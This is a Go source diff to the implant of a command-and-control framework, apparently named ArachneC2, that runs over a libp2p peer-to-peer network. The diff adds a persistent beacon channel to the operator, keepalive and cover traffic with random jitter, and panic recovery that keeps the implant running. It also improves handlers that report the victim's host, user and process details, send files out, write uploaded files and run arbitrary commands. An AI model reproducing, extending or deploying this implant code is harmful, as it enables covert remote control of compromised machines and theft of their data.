@@ -2,39 +2,48 @@ package core
 
 import (
 	"context"
+	"crypto/rand"
 	"encoding/binary"
+	"errors"
 	"fmt"
+	"io"
 	"log"
-	"math/rand"
 	"os"
 	"os/exec"
 	"os/user"
+	"path/filepath"
 	"runtime"
 	"sync"
 	"time"
 
 	"github.com/libp2p/go-libp2p"
 	"github.com/libp2p/go-libp2p/core/crypto"
+	"github.com/libp2p/go-libp2p/core/network"
 	"github.com/libp2p/go-libp2p/core/peer"
 	tcp "github.com/libp2p/go-libp2p/p2p/transport/tcp"
+	ws "github.com/libp2p/go-libp2p/p2p/transport/websocket"
 	"github.com/multiformats/go-multiaddr"
 	"google.golang.org/protobuf/proto"
 
 	"github.com/portbuster1337/ArachneC2/pkg/cryptography"
 	"github.com/portbuster1337/ArachneC2/pkg/transport"
 	apb "github.com/portbuster1337/ArachneC2/protobuf/apb"
+	cpb "github.com/portbuster1337/ArachneC2/protobuf/cpb"
 )
 
 type Agent struct {
-	node        *transport.Node
-	messenger   *transport.Messenger
-	keys        *cryptography.ImplantKey
-	operatorPub crypto.PubKey
-	config      AgentConfig
-	ctx         context.Context
-	cancel      context.CancelFunc
-	connected   bool
-	connectedMu sync.Mutex
+	node         *transport.Node
+	messenger    *transport.Messenger
+	keys         *cryptography.ImplantKey
+	operatorPub  crypto.PubKey
+	config       AgentConfig
+	ctx          context.Context
+	cancel       context.CancelFunc
+	connected    bool
+	connectedMu  sync.Mutex
+	wg           sync.WaitGroup
+	beaconStream network.Stream
+	beaconMu     sync.Mutex
 }
 
 type AgentConfig struct {
@@ -102,18 +111,19 @@ func NewAgent(ctx context.Context, cfg AgentConfig) (*Agent, error) {
 	}
 
 	nodeCfg := transport.NodeConfig{
-		ListenAddr:     "/ip4/0.0.0.0/tcp/0",
+		ListenAddr:     "/ip4/0.0.0.0/tcp/0/ws",
 		BootstrapPeers: transport.DefaultBootstrapAddrs(),
 		EnableRelay:    true,
-		EnableMDNS:     true,
+		EnableMDNS:     false,
 		EnableDHT:      true,
 		RelayAddrs:     cfg.RelayAddrs,
+		PrivateKey:     keys.PrivateKey,
 	}
 
 	node, err := transport.NewNode(ctx, nodeCfg,
 		libp2p.NoTransports,
+		libp2p.Transport(ws.New),
 		libp2p.Transport(tcp.NewTCPTransport),
-		libp2p.EnableHolePunching(),
 	)
 	if err != nil {
 		cancel()
@@ -167,26 +177,46 @@ func (a *Agent) Start() error {
 		return fmt.Errorf("listen task: %w", err)
 	}
 
+	a.node.SetStreamHandler(transport.CmdProtocolID, a.handleCommandStream)
+
 	ns := a.messenger.RendezvousString()
 	if a.node.DHT != nil {
+		a.wg.Add(1)
 		go a.discoverOperatorLoop(ns)
 	}
 
 	a.node.SetStreamHandler(transport.ShellProtocolID, a.handleShellStream)
 	a.node.SetStreamHandler(transport.PortfwdProtocolID, a.handlePortfwdStream)
 
+	a.wg.Add(1)
 	go a.beaconLoop()
 
 	if a.config.CoverTraffic {
+		a.wg.Add(1)
 		go a.coverTrafficLoop()
 	}
+
+	a.wg.Add(1)
+	go a.streamKeepaliveLoop()
 
 	return nil
 }
 
 func (a *Agent) discoverOperatorLoop(ns string) {
+	defer a.wg.Done()
+	defer func() {
+		if r := recover(); r != nil {
+			log.Printf("[implant] panic in discoverOperatorLoop: %v", r)
+		}
+	}()
 	log.Printf("[implant] DHT discovery started for: %s", ns)
-	for a.node.DHT == nil || a.node.DHT.RoutingTable().Size() == 0 {
+	for {
+		if a.node.DHT != nil {
+			rt := a.node.DHT.RoutingTable()
+			if rt != nil && rt.Size() > 0 {
+				break
+			}
+		}
 		select {
 		case <-a.ctx.Done():
 			return
@@ -195,33 +225,51 @@ func (a *Agent) discoverOperatorLoop(ns string) {
 	}
 
 	for {
-		peerCh, err := a.node.FindPeers(a.ctx, ns)
-		if err != nil {
-			log.Printf("[implant] DHT find peers: %v", err)
-			select {
-			case <-a.ctx.Done():
+		func() {
+			defer func() {
+				if r := recover(); r != nil {
+					log.Printf("[implant] panic in discoverOperatorLoop iteration: %v", r)
+				}
+			}()
+			peerCh, err := a.node.FindPeers(a.ctx, ns)
+			if err != nil {
+				log.Printf("[implant] DHT find peers: %v", err)
 				return
-			case <-time.After(15 * time.Second):
 			}
-			continue
-		}
 
-		for pi := range peerCh {
-			if pi.ID == a.node.ID() || len(pi.Addrs) == 0 {
-				continue
+			for pi := range peerCh {
+				if pi.ID == a.node.ID() || pi.ID != a.messenger.OperatorID() || len(pi.Addrs) == 0 {
+					continue
+				}
+				if err := a.node.ConnectToPeer(a.ctx, pi); err != nil {
+					log.Printf("[implant] DHT connect to %s: %v", pi.ID.String(), err)
+					continue
+				}
+				a.connectedMu.Lock()
+				if !a.connected {
+					a.connected = true
+					a.connectedMu.Unlock()
+					log.Printf("[implant] connected to operator via DHT: %s", pi.ID.String())
+					go a.sendBeaconDirect(pi.ID)
+				} else {
+					a.beaconMu.Lock()
+					streamNil := a.beaconStream == nil
+					a.beaconMu.Unlock()
+					a.connectedMu.Unlock()
+					if streamNil {
+						log.Printf("[implant] beacon stream nil, reconnecting to %s", pi.ID.String())
+						go a.sendBeaconDirect(pi.ID)
+					}
+				}
 			}
-			if err := a.node.ConnectToPeer(a.ctx, pi); err != nil {
-				log.Printf("[implant] DHT connect to %s: %v", pi.ID.String(), err)
-				continue
-			}
+
 			a.connectedMu.Lock()
-			if !a.connected {
-				a.connected = true
-				log.Printf("[implant] connected to operator via DHT: %s", pi.ID.String())
-				go a.sendBeaconDirect(pi.ID)
+			cs := a.node.Host.Network().Connectedness(a.messenger.OperatorID())
+			if a.connected && cs != network.Connected && cs != network.Limited {
+				a.connected = false
 			}
 			a.connectedMu.Unlock()
-		}
+		}()
 
 		select {
 		case <-a.ctx.Done():
@@ -231,11 +279,27 @@ func (a *Agent) discoverOperatorLoop(ns string) {
 	}
 }
 
-func (a *Agent) beaconLoop() {
-	for {
-		a.sendBeaconRegister()
+func cryptoJitter(max time.Duration) time.Duration {
+	if max <= 0 {
+		return 0
+	}
+	var buf [8]byte
+	rand.Read(buf[:])
+	n := int64(binary.LittleEndian.Uint64(buf[:]) & 0x7FFFFFFFFFFFFFFF)
+	return time.Duration(n % int64(max))
+}
 
-		jitter := time.Duration(rand.Int63n(int64(a.config.BeaconJitter)))
+func (a *Agent) beaconLoop() {
+	defer a.wg.Done()
+	for {
+		func() {
+			defer func() {
+				recover()
+			}()
+			a.sendBeaconRegister()
+		}()
+
+		jitter := cryptoJitter(a.config.BeaconJitter)
 		sleep := a.config.BeaconInterval + jitter
 
 		select {
@@ -246,9 +310,41 @@ func (a *Agent) beaconLoop() {
 	}
 }
 
-func (a *Agent) coverTrafficLoop() {
+func (a *Agent) streamKeepaliveLoop() {
+	defer a.wg.Done()
 	for {
-		jitter := time.Duration(rand.Int63n(int64(a.config.CoverJitter)))
+		select {
+		case <-a.ctx.Done():
+			return
+		case <-time.After(5 * time.Second):
+		}
+
+		func() {
+			defer func() {
+				recover()
+			}()
+
+			a.connectedMu.Lock()
+			connected := a.connected
+			opID := a.messenger.OperatorID()
+			a.connectedMu.Unlock()
+
+			if !connected {
+				return
+			}
+
+			env := a.messenger.CreateEnvelope(transport.MsgTypeCover, nil)
+			if err := a.sendEnvelopeDirect(opID, env); err != nil {
+				// keepalive failures expected when circuit is dead
+			}
+		}()
+	}
+}
+
+func (a *Agent) coverTrafficLoop() {
+	defer a.wg.Done()
+	for {
+		jitter := cryptoJitter(a.config.CoverJitter)
 		sleep := a.config.CoverInterval + jitter
 
 		select {
@@ -257,7 +353,12 @@ func (a *Agent) coverTrafficLoop() {
 		case <-time.After(sleep):
 		}
 
-		a.sendCoverTraffic()
+		func() {
+			defer func() {
+				recover()
+			}()
+			a.sendCoverTraffic()
+		}()
 	}
 }
 
@@ -280,20 +381,24 @@ func (a *Agent) sendBeaconRegister() {
 	} else if err == nil && u.Username != "" {
 		username = u.Username
 	}
+	uid, gid := "", ""
+	if runtime.GOOS != "windows" {
+		uid = fmt.Sprintf("%d", os.Getuid())
+		gid = fmt.Sprintf("%d", os.Getgid())
+	}
 	reg := &apb.Register{
 		Name:     username,
 		Hostname: hostname,
 		Username: username,
-		UID:      fmt.Sprintf("%d", os.Getuid()),
-		GID:      fmt.Sprintf("%d", os.Getgid()),
+		UID:      uid,
+		GID:      gid,
 		OS:       runtime.GOOS,
 		Arch:     runtime.GOARCH,
 		PID:      int32(os.Getpid()),
 		Filename: os.Args[0],
 		Version:  "0.1.0",
 		Locale:   os.Getenv("LANG"),
-		PeerID: int64(os.Getpid()),
-		ActiveC2: a.node.ID().String(),
+		ActiveC2: a.messenger.OperatorID().String(),
 	}
 
 	beaconReg := &apb.Z1{
@@ -309,14 +414,35 @@ func (a *Agent) sendBeaconRegister() {
 	}
 
 	env := a.messenger.CreateEnvelope(transport.MsgTypeRegister, beaconData)
+
+	a.connectedMu.Lock()
+	connected := a.connected
+	opID := a.messenger.OperatorID()
+	a.connectedMu.Unlock()
+
+	if connected {
+		if err := a.sendEnvelopeDirect(opID, env); err == nil {
+			log.Printf("[implant] sent beacon register to %s", opID.String())
+			return
+		}
+	}
+
 	topic := a.messenger.BeaconTopic()
 	if err := a.messenger.SignAndSend(a.ctx, topic, env); err != nil {
 		log.Printf("[implant] send register: %v", err)
-		return
 	}
 }
 
+
+
 func (a *Agent) sendBeaconDirect(operatorID peer.ID) {
+	defer func() {
+		if r := recover(); r != nil {
+			log.Printf("[implant] panic in sendBeaconDirect: %v", r)
+		}
+	}()
+	log.Printf("[implant] sending direct beacon to %s", operatorID.String())
+
 	hostname, _ := os.Hostname()
 	username := os.Getenv("USER")
 	if username == "" {
@@ -327,21 +453,26 @@ func (a *Agent) sendBeaconDirect(operatorID peer.ID) {
 	} else if err == nil && u.Username != "" {
 		username = u.Username
 	}
+	uid, gid := "", ""
+	if runtime.GOOS != "windows" {
+		uid = fmt.Sprintf("%d", os.Getuid())
+		gid = fmt.Sprintf("%d", os.Getgid())
+	}
 	reg := &apb.Register{
 		Name:     username,
 		Hostname: hostname,
 		Username: username,
-		UID:      fmt.Sprintf("%d", os.Getuid()),
-		GID:      fmt.Sprintf("%d", os.Getgid()),
+		UID:      uid,
+		GID:      gid,
 		OS:       runtime.GOOS,
 		Arch:     runtime.GOARCH,
 		PID:      int32(os.Getpid()),
 		Filename: os.Args[0],
 		Version:  "0.1.0",
 		Locale:   os.Getenv("LANG"),
-		PeerID:   int64(os.Getpid()),
-		ActiveC2: a.node.ID().String(),
+		ActiveC2: a.messenger.OperatorID().String(),
 	}
+
 	beaconReg := &apb.Z1{
 		ID:       a.node.ID().String(),
 		Interval: int64(a.config.BeaconInterval.Seconds()),
@@ -354,35 +485,11 @@ func (a *Agent) sendBeaconDirect(operatorID peer.ID) {
 		return
 	}
 	env := a.messenger.CreateEnvelope(transport.MsgTypeRegister, beaconData)
-	sig, err := a.keys.PrivateKey.Sign(env.Data)
-	if err != nil {
-		log.Printf("[implant] direct beacon sign: %v", err)
-		return
-	}
-	env.Signature = sig
-	pubBytes, err := crypto.MarshalPublicKey(a.keys.PrivateKey.GetPublic())
-	if err == nil {
-		env.SenderKey = pubBytes
-	}
-
-	s, err := a.node.NewStream(a.ctx, operatorID, transport.BeaconProtocolID)
-	if err != nil {
-		log.Printf("[implant] direct beacon stream: %v", err)
-		return
-	}
-	defer s.Close()
-
-	envData, err := proto.Marshal(env)
-	if err != nil {
-		log.Printf("[implant] direct beacon marshal env: %v", err)
-		return
-	}
-	if err := binary.Write(s, binary.LittleEndian, uint32(len(envData))); err != nil {
-		log.Printf("[implant] direct beacon write len: %v", err)
-		return
-	}
-	if _, err := s.Write(envData); err != nil {
-		log.Printf("[implant] direct beacon write data: %v", err)
+	if err := a.sendEnvelopeDirect(operatorID, env); err != nil {
+		log.Printf("[implant] direct beacon send: %v", err)
+		a.connectedMu.Lock()
+		a.connected = false
+		a.connectedMu.Unlock()
 		return
 	}
 	log.Printf("[implant] sent direct beacon to %s", operatorID.String())
@@ -422,8 +529,127 @@ func (a *Agent) handleCommand(ctx context.Context, env *apb.Envelope, senderPub 
 	}
 }
 
+func (a *Agent) handleCommandStream(s network.Stream) {
+	defer func() {
+		recover()
+	}()
+	defer s.Close()
+
+	remotePeer := s.Conn().RemotePeer()
+	log.Printf("[implant] command stream from %s", remotePeer.String())
+
+	var msgLen uint32
+	if err := binary.Read(s, binary.LittleEndian, &msgLen); err != nil {
+		log.Printf("[implant] command stream read len: %v", err)
+		return
+	}
+	if msgLen > 1<<20 {
+		return
+	}
+	data := make([]byte, msgLen)
+	if _, err := io.ReadFull(s, data); err != nil {
+		log.Printf("[implant] command stream read data: %v", err)
+		return
+	}
+
+	env := &apb.Envelope{}
+	if err := proto.Unmarshal(data, env); err != nil {
+		log.Printf("[implant] command stream unmarshal: %v", err)
+		return
+	}
+
+	a.handleCommand(a.ctx, env, nil)
+}
+
+func (a *Agent) openBeaconStream(operatorID peer.ID) (network.Stream, error) {
+	ctx, cancel := context.WithTimeout(a.ctx, 15*time.Second)
+	defer cancel()
+	ctx = network.WithAllowLimitedConn(ctx, "beacon stream")
+
+	s, err := a.node.NewStream(ctx, operatorID, transport.BeaconProtocolID)
+	if err != nil {
+		return nil, fmt.Errorf("open stream: %w", err)
+	}
+	return s, nil
+}
+
+func (a *Agent) sendEnvelopeDirect(operatorID peer.ID, env *apb.Envelope) error {
+	signingData, err := transport.EnvelopeSigningBytes(env)
+	if err != nil {
+		return fmt.Errorf("marshal signing data: %w", err)
+	}
+	sig, err := a.keys.PrivateKey.Sign(signingData)
+	if err != nil {
+		return fmt.Errorf("sign: %w", err)
+	}
+	env.Signature = sig
+	pubBytes, err := crypto.MarshalPublicKey(a.keys.PrivateKey.GetPublic())
+	if err == nil {
+		env.SenderKey = pubBytes
+	}
+
+	a.beaconMu.Lock()
+	defer a.beaconMu.Unlock()
+
+	if a.beaconStream == nil {
+		cs := a.node.Host.Network().Connectedness(operatorID)
+		if cs != network.Connected && cs != network.Limited {
+			connCtx, cancel := context.WithTimeout(a.ctx, 5*time.Second)
+			err := a.node.ConnectToPeer(connCtx, peer.AddrInfo{ID: operatorID})
+			cancel()
+			if err != nil {
+				return fmt.Errorf("connect: %w", err)
+			}
+		}
+		a.beaconStream, err = a.openBeaconStream(operatorID)
+		if err != nil {
+			return fmt.Errorf("open persistent stream: %w", err)
+		}
+		log.Printf("[implant] persistent beacon stream opened")
+	}
+
+	envData, err := proto.Marshal(env)
+	if err != nil {
+		return fmt.Errorf("marshal: %w", err)
+	}
+	a.beaconStream.SetWriteDeadline(time.Now().Add(5 * time.Second))
+	if err := binary.Write(a.beaconStream, binary.LittleEndian, uint32(len(envData))); err != nil {
+		a.beaconStream.Close()
+		a.beaconStream = nil
+		return fmt.Errorf("write len: %w", err)
+	}
+	if _, err := a.beaconStream.Write(envData); err != nil {
+		a.beaconStream.Close()
+		a.beaconStream = nil
+		return fmt.Errorf("write data: %w", err)
+	}
+	var zero time.Time
+	a.beaconStream.SetWriteDeadline(zero)
+	return nil
+}
+
+func (a *Agent) sendError(msgType uint32, errMsg string) {
+	errResp := &cpb.Response{Err: 1, ErrMsg: errMsg}
+	errData, _ := proto.Marshal(errResp)
+	a.sendResult(msgType, errData)
+}
+
 func (a *Agent) sendResult(resultType uint32, data []byte) {
 	env := a.messenger.CreateEnvelope(resultType, data)
+
+	a.connectedMu.Lock()
+	connected := a.connected
+	opID := a.messenger.OperatorID()
+	a.connectedMu.Unlock()
+
+	if connected {
+		if err := a.sendEnvelopeDirect(opID, env); err != nil {
+			log.Printf("[implant] direct result failed, fallback pubsub: %v", err)
+		} else {
+			return
+		}
+	}
+
 	topic := a.messenger.BeaconTopic()
 	if err := a.messenger.SignAndSend(a.ctx, topic, env); err != nil {
 		log.Printf("[implant] send result: %v", err)
@@ -446,10 +672,27 @@ func (a *Agent) handlePing(env *apb.Envelope) {
 func (a *Agent) handleDownload(env *apb.Envelope) {
 	req := &apb.Z22{}
 	if err := proto.Unmarshal(env.Data, req); err != nil {
+		a.sendError(transport.MsgTypeDownload, fmt.Sprintf("unmarshal: %v", err))
 		return
 	}
 
 	result := &apb.Z23{Path: req.Path}
+	fi, err := os.Stat(req.Path)
+	if err != nil {
+		result.Exists = false
+		respData, _ := proto.Marshal(result)
+		a.sendResult(transport.MsgTypeDownload, respData)
+		return
+	}
+	const maxDownloadSize = 100 << 20 // 100MB
+	if fi.Size() > maxDownloadSize {
+		result.Exists = true
+		result.Response = &cpb.Response{Err: 1, ErrMsg: "file too large"}
+		respData, _ := proto.Marshal(result)
+		log.Printf("[implant] download %s: too large (%d bytes)", req.Path, fi.Size())
+		a.sendResult(transport.MsgTypeDownload, respData)
+		return
+	}
 	data, err := os.ReadFile(req.Path)
 	if err != nil {
 		result.Exists = false
@@ -466,6 +709,19 @@ func (a *Agent) handleDownload(env *apb.Envelope) {
 func (a *Agent) handleUpload(env *apb.Envelope) {
 	req := &apb.Z24{}
 	if err := proto.Unmarshal(env.Data, req); err != nil {
+		a.sendError(transport.MsgTypeUpload, fmt.Sprintf("unmarshal: %v", err))
+		return
+	}
+
+	const maxUploadSize = 100 << 20
+	if len(req.Data) > maxUploadSize {
+		log.Printf("[implant] upload %s: too large (%d bytes)", req.Path, len(req.Data))
+		result := &apb.Z25{
+			Path:     req.Path,
+			Response: &cpb.Response{Err: 1, ErrMsg: "file too large"},
+		}
+		respData, _ := proto.Marshal(result)
+		a.sendResult(transport.MsgTypeUpload, respData)
 		return
 	}
 
@@ -473,17 +729,19 @@ func (a *Agent) handleUpload(env *apb.Envelope) {
 	perm := os.FileMode(0644)
 	if req.Overwrite {
 		if err := os.WriteFile(req.Path, req.Data, perm); err != nil {
-			return
+			result.Response = &cpb.Response{Err: 1, ErrMsg: err.Error()}
+		} else {
+			result.BytesWritten = int32(len(req.Data))
 		}
 	} else {
 		if _, err := os.Stat(req.Path); err == nil {
-			return
-		}
-		if err := os.WriteFile(req.Path, req.Data, perm); err != nil {
-			return
+			result.Response = &cpb.Response{Err: 1, ErrMsg: "file already exists"}
+		} else if err := os.WriteFile(req.Path, req.Data, perm); err != nil {
+			result.Response = &cpb.Response{Err: 1, ErrMsg: err.Error()}
+		} else {
+			result.BytesWritten = int32(len(req.Data))
 		}
 	}
-	result.BytesWritten = int32(len(req.Data))
 
 	respData, _ := proto.Marshal(result)
 	log.Printf("[implant] upload %s: %d bytes", req.Path, len(req.Data))
@@ -492,25 +750,31 @@ func (a *Agent) handleUpload(env *apb.Envelope) {
 
 func (a *Agent) handleScreenshot(env *apb.Envelope) {
 	log.Printf("[implant] screenshot requested (not implemented on this platform)")
-	a.sendResult(transport.MsgTypeScreenshot, nil)
+	result := &apb.Z3{
+		Response: &cpb.Response{Err: 1, ErrMsg: "screenshot not implemented on this platform"},
+	}
+	data, _ := proto.Marshal(result)
+	a.sendResult(transport.MsgTypeScreenshot, data)
 }
 
 func (a *Agent) handleCd(env *apb.Envelope) {
 	req := &apb.Z19{}
 	if err := proto.Unmarshal(env.Data, req); err != nil {
+		a.sendError(transport.MsgTypeCd, fmt.Sprintf("unmarshal: %v", err))
 		return
 	}
 
 	result := &apb.Z21{}
 	if err := os.Chdir(req.Path); err != nil {
-		result.Path, _ = os.Getwd()
+		result.Path = req.Path
+		result.Response = &cpb.Response{Err: 1, ErrMsg: err.Error()}
 	} else {
 		result.Path, _ = os.Getwd()
 	}
 
 	data, _ := proto.Marshal(result)
 	log.Printf("[implant] cd %s -> %s", req.Path, result.Path)
-	a.sendResult(transport.MsgTypePwd, data)
+	a.sendResult(transport.MsgTypeCd, data)
 }
 
 func (a *Agent) handlePwd(env *apb.Envelope) {
@@ -524,33 +788,69 @@ func (a *Agent) handlePwd(env *apb.Envelope) {
 
 func (a *Agent) handleKill(env *apb.Envelope) {
 	log.Printf("[implant] kill received, shutting down")
+	buf := make([]byte, 4096)
+	n := runtime.Stack(buf, false)
+	log.Printf("[implant] kill stack:\n%s", string(buf[:n]))
+	df, _ := os.Create("implant_debug.txt")
+	if df != nil {
+		fmt.Fprintf(df, "KILLED\n")
+		fmt.Fprintf(df, "%s\n", string(buf[:n]))
+		df.Close()
+	}
+	a.sendResult(transport.MsgTypeKill, nil)
+	time.Sleep(100 * time.Millisecond)
 	os.Exit(0)
 }
 
 func (a *Agent) handleLs(env *apb.Envelope) {
 	req := &apb.Z16{}
 	if err := proto.Unmarshal(env.Data, req); err != nil {
+		a.sendError(transport.MsgTypeLs, fmt.Sprintf("unmarshal: %v", err))
 		return
 	}
 
 	result := &apb.Z17{Path: req.Path}
-	entries, err := os.ReadDir(req.Path)
+	fi, err := os.Stat(req.Path)
 	if err != nil {
 		result.Exists = false
 	} else {
 		result.Exists = true
-		for _, e := range entries {
-			info, _ := e.Info()
-			fi := &apb.Z18{
-				Name:  e.Name(),
-				IsDir: e.IsDir(),
+		if fi.IsDir() {
+			entries, err := os.ReadDir(req.Path)
+			if err != nil {
+				result.Exists = false
+			} else {
+				for _, e := range entries {
+					info, _ := e.Info()
+					entry := &apb.Z18{
+						Name:  e.Name(),
+						IsDir: e.IsDir(),
+					}
+					if e.Type()&os.ModeSymlink != 0 {
+						link, _ := os.Readlink(filepath.Join(req.Path, e.Name()))
+						entry.Link = link
+					}
+					if info != nil {
+						entry.Size = info.Size()
+						entry.ModTime = info.ModTime().Unix()
+						entry.Mode = info.Mode().String()
+					}
+					result.Files = append(result.Files, entry)
+				}
 			}
-			if info != nil {
-				fi.Size = info.Size()
-				fi.ModTime = info.ModTime().Unix()
-				fi.Mode = info.Mode().String()
+		} else {
+			entry := &apb.Z18{
+				Name:    fi.Name(),
+				IsDir:   false,
+				Size:    fi.Size(),
+				ModTime: fi.ModTime().Unix(),
+				Mode:    fi.Mode().String(),
 			}
-			result.Files = append(result.Files, fi)
+			if fi.Mode()&os.ModeSymlink != 0 {
+				link, _ := os.Readlink(req.Path)
+				entry.Link = link
+			}
+			result.Files = append(result.Files, entry)
 		}
 	}
 
@@ -562,21 +862,35 @@ func (a *Agent) handleLs(env *apb.Envelope) {
 func (a *Agent) handleExecute(env *apb.Envelope) {
 	req := &apb.Z14{}
 	if err := proto.Unmarshal(env.Data, req); err != nil {
+		a.sendError(transport.MsgTypeExecute, fmt.Sprintf("unmarshal: %v", err))
 		return
 	}
 
 	result := &apb.Z15{}
-	cmd := exec.CommandContext(a.ctx, req.Path, req.Args...)
 	if req.Output {
+		cmd := exec.CommandContext(a.ctx, req.Path, req.Args...)
 		out, err := cmd.CombinedOutput()
 		if err != nil {
-			result.Status = 1
+			var exitErr *exec.ExitError
+			if errors.As(err, &exitErr) {
+				result.Status = uint32(exitErr.ExitCode())
+			} else {
+				result.Status = 1
+			}
 			result.Stderr = []byte(err.Error())
 		}
 		result.Stdout = out
 	} else {
+		cmd := exec.Command(req.Path, req.Args...)
+		cmd.Stdout = io.Discard
+		cmd.Stderr = io.Discard
 		if err := cmd.Start(); err != nil {
-			result.Status = 1
+			var exitErr *exec.ExitError
+			if errors.As(err, &exitErr) {
+				result.Status = uint32(exitErr.ExitCode())
+			} else {
+				result.Status = 1
+			}
 			result.Stderr = []byte(err.Error())
 		} else {
 			result.Pid = uint32(cmd.Process.Pid)
@@ -591,5 +905,6 @@ func (a *Agent) handleExecute(env *apb.Envelope) {
 
 func (a *Agent) Close() error {
 	a.cancel()
+	a.wg.Wait()
 	return a.node.Close()
 }
